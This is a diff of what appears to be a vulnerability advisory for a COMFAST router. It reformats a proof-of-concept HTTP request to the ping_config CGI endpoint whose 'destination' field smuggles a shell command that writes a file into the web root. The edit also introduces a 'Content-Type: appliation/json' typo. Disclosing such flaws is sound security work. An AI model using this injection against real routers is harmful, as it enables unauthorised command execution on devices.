@@ -58,30 +58,18 @@ This allows attackers to inject arbitrary commands by adding delimiters (e.g., `
 
 
 ```
-POST http://192.168.0.1/cgi-bin/mbox-config?method=SET\&section=ping\_config HTTP/1.1
-
+POST /cgi-bin/mbox-config?method=SET&section=ping_config HTTP/1.1
 Host: cflogin.cn
-
-Content-Length: 124
-
-Accept: application/json, text/javascript, \*/\*; q=0.01
-
+Content-Length: 76
+Accept: application/json, text/javascript, */*; q=0.01
 X-Requested-With: XMLHttpRequest
-
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
-
-Content-Type: application/json
-
+Content-Type: appliation/json
 Origin: http://cflogin.cn
-
-Referer: http://cflogin.cn/guide/guide\_router.html
-
+Referer: http://cflogin.cn/guide/guide_router.html
 Accept-Encoding: gzip, deflate, br
-
 Accept-Language: zh-CN,zh;q=0.9
-
-Cookie: COMFAST\_SESSIONID=c0a800a0-ffffffc40f08ffffffaaffffff82fffffff0-6b8b4567
-
+Cookie: COMFAST_SESSIONID=c0a800a0-ffffffc40f08ffffffaaffffff82fffffff0-6b8b4567
 Connection: close
 
 {"destination": "127.0.0.1\"; echo  ping config >  /www-comfast/test.txt #"}
